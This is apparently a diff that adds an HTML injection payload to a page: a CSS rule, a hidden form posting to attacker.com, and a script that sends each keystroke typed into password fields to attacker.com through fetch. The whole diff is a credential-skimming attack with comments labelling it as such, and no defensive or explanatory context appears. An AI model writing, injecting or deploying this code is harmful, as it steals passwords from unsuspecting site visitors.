@@ -1,0 +1,20 @@
+<!-- Inject CSS keylogger -->
+<style>
+  input[type="password"] {
+    background-image: url('https://attacker.com/log?key=');
+  }
+</style>
+
+<!-- Inject form untuk steal password -->
+<form action="https://attacker.com/steal" method="POST" style="display:none;">
+  <input type="password" name="pass" id="steal-input">
+</form>
+
+<script>
+  // Capture password input
+  document.querySelectorAll('input[type="password"]').forEach(input => {
+    input.addEventListener('input', (e) => {
+      fetch('https://attacker.com/log?key=' + e.target.value);
+    })
+  })
+</script>
